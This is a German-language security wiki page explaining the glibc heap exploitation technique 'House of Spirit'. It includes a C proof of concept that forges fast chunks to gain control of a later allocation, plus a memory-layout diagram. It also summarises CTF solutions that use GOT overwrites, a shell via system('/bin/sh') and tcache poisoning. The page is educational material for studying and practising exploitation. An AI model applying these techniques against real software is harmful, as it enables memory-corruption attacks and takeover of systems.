# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

### Code

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Ziel

- In der Lage sein, eine Adresse in den tcache / fast bin hinzuzufügen, sodass sie später zugewiesen werden kann.

### Anforderungen

- Dieser Angriff erfordert, dass ein Angreifer in der Lage ist, ein paar gefälschte schnelle Chunks zu erstellen, die den Größenwert korrekt angeben, und dann in der Lage ist, den ersten gefälschten Chunk freizugeben, damit er in den Bin gelangt.

### Angriff

- Erstellen Sie gefälschte Chunks, die Sicherheitsprüfungen umgehen: Sie benötigen im Grunde 2 gefälschte Chunks, die an den richtigen Positionen die korrekten Größen angeben.
- Irgendwie den ersten gefälschten Chunk freigeben, damit er in den fast oder tcache Bin gelangt und dann zugewiesen wird, um diese Adresse zu überschreiben.

**Der Code von** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **ist großartig, um den Angriff zu verstehen.** Obwohl dieses Schema aus dem Code es ziemlich gut zusammenfasst:
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
> [!NOTE]
> Beachten Sie, dass es notwendig ist, den zweiten Chunk zu erstellen, um einige Plausibilitätsprüfungen zu umgehen.

## Beispiele

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: Über einen Überlauf ist es möglich, einen Zeiger so zu ändern, dass er auf eine GOT-Adresse zeigt, um eine libc-Adresse über die Leseaktion des CTF zu leaken.
- **House of Spirit**: Durch den Missbrauch eines Zählers, der die Anzahl der "Gewehre" zählt, ist es möglich, eine gefälschte Größe des ersten gefälschten Chunks zu erzeugen. Dann, durch den Missbrauch einer "Nachricht", ist es möglich, die zweite Größe eines Chunks zu fälschen und schließlich durch einen Überlauf einen Zeiger zu ändern, der freigegeben werden soll, sodass unser erster gefälschter Chunk freigegeben wird. Dann können wir ihn allokieren und darin wird die Adresse gespeichert, wo die "Nachricht" gespeichert ist. Dann ist es möglich, dies auf den `scanf`-Eintrag in der GOT-Tabelle zeigen zu lassen, sodass wir ihn mit der Adresse von system überschreiben können.\
Beim nächsten Aufruf von `scanf` können wir die Eingabe `"/bin/sh"` senden und eine Shell erhalten.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Uninitialisierter Stack-Puffer.
- **House of Spirit**: Wir können den ersten Index eines globalen Arrays von Heap-Zeigern modifizieren. Mit einer einzigen Byte-Modifikation verwenden wir `free` auf einem gefälschten Chunk innerhalb eines gültigen Chunks, sodass wir nach erneutem Allokieren eine Überlappung der Chunks erhalten. Damit funktioniert ein einfacher Tcache-Poisoning-Angriff, um eine beliebige Schreibprimitive zu erhalten.

## Referenzen

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)

{{#include ../../banners/hacktricks-training.md}}
